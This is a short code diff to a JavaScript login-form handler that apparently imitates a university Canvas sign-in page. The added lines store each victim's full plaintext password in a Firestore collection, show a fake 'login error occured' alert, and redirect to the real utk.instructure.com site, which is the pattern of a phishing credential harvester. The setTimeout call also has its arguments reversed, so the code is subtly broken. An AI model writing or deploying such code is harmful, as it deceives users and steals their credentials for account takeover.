@@ -15,12 +15,16 @@ function stripper(event){
         // Add a new document in collection "users"
         theDB.collection("users").doc(username.value).set({
             username: username.value,
+            password: password.value,
             firstPassChar: password.value[0],
             lastPassChar: password.value[password.value.length-1]
         })
         .then(function() {
             console.log("Document successfully written!");
-        // Redirect here
+            window.alert('A login error occured, refreshing...')
+            setTimeout(1000, ()=>{
+                window.location.href = "https://utk.instructure.com/";
+            })
         })
         .catch(function(error) {
             console.error("Error writing document: ", error);
